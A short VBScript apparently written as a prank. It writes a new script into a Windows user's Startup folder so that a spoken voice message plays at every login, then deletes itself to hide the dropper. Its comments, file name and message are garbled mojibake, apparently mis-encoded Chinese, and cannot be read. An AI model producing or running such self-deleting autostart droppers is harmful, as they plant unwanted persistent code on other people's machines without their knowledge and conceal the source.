set fso=CreateObject("Scripting.FileSystemObject")
'�������ǿ����������·��
set path=fso.createtextfile("C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\��ϲ����.vbs",2)
path.writeline("CreateObject(""SAPI.SpVoice"").Speak""����һ��,��Ů�������ʶ�!""")
path.close
'������ɾ���Լ�
Dim delete
Set delete=CreateObject("Scripting.FileSystemObject")
delete.DeleteFile WScript.ScriptFullName